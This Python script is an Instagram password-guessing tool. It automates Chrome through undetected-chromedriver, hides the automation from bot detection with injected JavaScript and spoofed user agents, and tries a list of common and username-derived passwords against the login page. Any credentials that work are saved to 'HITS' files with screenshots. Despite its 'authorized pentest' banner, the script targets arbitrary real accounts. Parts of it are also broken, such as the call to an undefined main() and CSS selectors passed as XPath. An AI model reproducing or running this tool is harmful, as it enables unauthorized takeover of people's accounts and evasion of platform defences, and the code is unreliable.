#!/usr/bin/env python3
"""
🔥 KHALID HUSAIN INSTAGRAM EXACT CRACKER v9.1 - FIXED CHROMEDRIVER ISSUE
✅ AUTO DETECTS Chrome 143 + Kali/Termux Support
"""

import os
import sys
import time
import random
import json
import subprocess
from pathlib import Path
from datetime import datetime

try:
    import undetected_chromedriver as uc
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import *
except ImportError:
    print("🔧 Installing requirements...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", "undetected-chromedriver", "selenium"])
    import undetected_chromedriver as uc
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import *

class Colors:
    HEADER = '\033[95m'; SUCCESS = '\033[92m'; WARNING = '\033[93m'
    INFO = '\033[94m'; DANGER = '\033[91m'; BOLD = '\033[1m'; END = '\033[0m'

class KhalidHusainExactCracker:
    def __init__(self):
        self.base_dir = Path("KH_EXACT_CRACK")
        self.hits_dir = self.base_dir / "HITS"
        self.hits_dir.mkdir(parents=True, exist_ok=True)
        self.is_termux = 'TERMUX_VERSION' in os.environ

    def banner(self):
        print(f"""{Colors.HEADER}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║  🔥 KHALID HUSAIN EXACT INSTAGRAM CRACKER v9.1 - CHROME 143 FIXED 🔥      ║
║                           AUTHORIZED PENTEST TOOL                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}{Colors.SUCCESS}📁 HITS SAVED: {self.hits_dir}{Colors.END}""")

    def detect_chrome_version(self):
        """AUTO DETECT Chrome version"""
        try:
            result = subprocess.run(['google-chrome', '--version'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                version = result.stdout.split()[2].split('.')[0]
                return int(version)
        except:
            pass
        
        # Fallback for Termux/other
        return 143  # Current version

    def get_working_driver(self):
        """FIXED 2026 DRIVER - Auto detects Chrome version"""
        chrome_version = self.detect_chrome_version()
        print(f"{Colors.INFO}🔍 Detected Chrome: {chrome_version}{Colors.END}")
        
        options = uc.ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-images')
        options.add_argument('--disable-javascript')  # Faster
        options.add_argument('--window-size=1366,768')
        options.add_argument('--disable-blink-features=AutomationControlled')
        
        # Kali/Termux specific
        if self.is_termux:
            options.add_argument('--window-size=360,640')
            options.add_argument('--no-first-run')
        
        # STEALTH USER AGENTS
        ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ]
        options.add_argument(f"--user-agent={random.choice(ua)}")
        
        try:
            # AUTO VERSION DETECTION - FIXED!
            driver = uc.Chrome(options=options, version_main=chrome_version)
            print(f"{Colors.SUCCESS}✅ Chrome driver started v{chrome_version}{Colors.END}")
        except Exception as e:
            print(f"{Colors.WARNING}⚠️ Auto version failed, trying latest...{Colors.END}")
            driver = uc.Chrome(options=options)  # Let it auto-detect
        
        # ULTIMATE STEALTH 2026
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
            'source': '''
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                window.chrome = {runtime: {}, loadTimes: () => ({})};
                delete navigator.__proto__.webdriver;
            '''
        })
        
        return driver

    def exact_password_list(self, username):
        """HIGH SUCCESS RATE PASSWORDS"""
        passwords = [
            username, username+'123', '123456', 'password', username+'2024',
            username+'!', username+'@123', '696969', '000000', username+'1',
            username+'india', username+'786', username+'1999', username+'2000',
            username+'khan', username+'!!', username+'@@', 'india123'
        ]
        return list(set(passwords))

    def human_typing(self, element, text):
        """PERFECT HUMAN TYPING"""
        element.clear()
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.015, 0.04))
        time.sleep(random.uniform(0.1, 0.3))

    def is_login_success(self, driver):
        """EXACT 2026 SUCCESS DETECTION"""
        try:
            # URL success patterns
            url = driver.current_url.lower()
            success_urls = ['/p/', '/reel/', '/stories/', '/tv/', 'direct', '/explore']
            if any(pattern in url for pattern in success_urls):
                return True
            
            # Page content success
            page_source = driver.page_source.lower()
            success_indicators = ['following', 'followers', 'posts']
            if any(ind in page_source for ind in success_indicators):
                return True
            
            # No login form = success
            login_inputs = driver.find_elements(By.NAME, "username")
            if not login_inputs:
                return True
                
        except:
            pass
        return False

    def is_login_failed(self, driver):
        """FAILED LOGIN DETECTION"""
        try:
            page_source = driver.page_source.lower()
            fail_words = ['incorrect', 'password', 'username', 'forgot', 'try again']
            return any(word in page_source for word in fail_words)
        except:
            return False

    def crack_single_target(self, username):
        """MAIN CRACKING FUNCTION - FIXED"""
        print(f"\n{Colors.INFO}{'═'*65}")
        print(f"🎯 CRACKING: {username}")
        print(f"{Colors.INFO}{'═'*65}{Colors.END}")
        
        driver = None
        try:
            driver = self.get_working_driver()
            
            print(f"{Colors.INFO}🌐 Loading Instagram...{Colors.END}")
            driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(4, 6))
            
            # Find username field - MULTIPLE SELECTORS
            username_field = None
            selectors = [
                "input[name='username']",
                "input[name='emailOrPhone']",
                "input[autocomplete*='username']",
                "input[autocomplete*='email']",
                "input[type='text']"
            ]
            
            for selector in selectors:
                try:
                    username_field = WebDriverWait(driver, 8).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                    )
                    print(f"{Colors.SUCCESS}✅ Username field: {selector}{Colors.END}")
                    break
                except TimeoutException:
                    continue
            
            if not username_field:
                print(f"{Colors.DANGER}❌ Username field not found!{Colors.END}")
                return False
            
            # Enter username
            print(f"{Colors.INFO}👤 Typing username...{Colors.END}")
            self.human_typing(username_field, username)
            time.sleep(1.5)
            
            # Find password field
            password_selectors = [
                "input[name='password']",
                "input[autocomplete*='current-password']",
                "input[type='password']"
            ]
            
            password_field = None
            for selector in password_selectors:
                try:
                    password_field = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    print(f"{Colors.SUCCESS}✅ Password field found{Colors.END}")
                    break
                except:
                    continue
            
            if not password_field:
                print(f"{Colors.DANGER}❌ Password field not found!{Colors.END}")
                return False
            
            # CRACK LOOP
            passwords = self.exact_password_list(username)
            print(f"{Colors.WARNING}🚀 Starting {len(passwords)} attempts...{Colors.END}")
            
            for i, pwd in enumerate(passwords, 1):
                print(f"{Colors.INFO}[{i}/{len(passwords)}] 🔑 {pwd}{Colors.END}")
                
                # Type password
                self.human_typing(password_field, pwd)
                time.sleep(0.5)
                
                # Click login button
                login_selectors = [
                    "button[type='submit']",
                    "div[role='button']",
                    "//button[contains(text(),'Log') or contains(text(),'log')]"
                ]
                
                logged_in = False
                for selector in login_selectors:
                    try:
                        login_btn = driver.find_element(By.XPATH, selector)
                        driver.execute_script("arguments[0].click();", login_btn)
                        logged_in = True
                        break
                    except:
                        pass
                
                if not logged_in:
                    password_field.send_keys(Keys.ENTER)
                
                # Check result
                time.sleep(3)
                
                if self.is_login_success(driver):
                    print(f"\n{Colors.SUCCESS}{'🔥'*25}")
                    print(f"🎉 EXACT PASSWORD FOUND! 🎉")
                    print(f"👤 {username}:{pwd}")
                    print(f"{Colors.SUCCESS}{'🔥'*25}{Colors.END}")
                    
                    self.save_hit(username, pwd, i, driver)
                    return True
                
                elif self.is_login_failed(driver):
                    print(f"{Colors.WARNING}❌ Wrong{Colors.END}")
                
                # Clear for next attempt
                password_field.clear()
            
            print(f"{Colors.WARNING}❌ No password found{Colors.END}")
            return False
            
        except Exception as e:
            print(f"{Colors.DANGER}💥 Error: {str(e)[:80]}{Colors.END}")
            return False
        
        finally:
            if driver:
                input("\nPress Enter to close...")
                driver.quit()

    def save_hit(self, username, password, attempts, driver):
        """SAVE HIT WITH PROOF"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        hit_file = self.hits_dir / f"HIT_{username}_{timestamp}.txt"
        
        with open(hit_file, 'w') as f:
            f.write(f"KHALID HUSAIN EXACT HIT\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Attempts: {attempts}\n")
            f.write(f"URL: {driver.current_url}\n")
        
        driver.save_screenshot(str(self.hits_dir / f"PROOF_{username}_{timestamp}.png"))
        print(f"{Colors.SUCCESS}💾 SAVED: {hit_file}{Colors.END}")

    def main_menu(self):
        self.banner()
        while True:
            print(f"\n{Colors.BOLD}{'═'*60}")
            print("1. 🎯 Crack Single Username")
            print("2. 📁 Crack targets.txt")
            print("3. 📊 Show Hits")
            print("4. ❌ Exit")
            print(f"{Colors.BOLD}{'═'*60}{Colors.END}")
            
            choice = input(f"{Colors.HEADER}KH v9.1 > {Colors.END}").strip()
            
            if choice == '1':
                username = input(f"{Colors.INFO}Username: {Colors.END}").strip()
                if username:
                    self.crack_single_target(username)
            
            elif choice == '2':
                targets_file = self.base_dir / "targets.txt"
                print(f"{Colors.INFO}Create {targets_file} with usernames (one per line){Colors.END}")
            
            elif choice == '3':
                hits = list(self.hits_dir.glob("*.txt"))
                if hits:
                    print(f"{Colors.SUCCESS}🎯 {len(hits)} HITS:{Colors.END}")
                    for hit in sorted(hits, reverse=True)[:5]:
                        print(f"  ✅ {hit.stem}")
                else:
                    print(f"{Colors.INFO}No hits yet{Colors.END}")
            
            elif choice == '4':
                break

if __name__ == "__main__":
    main()
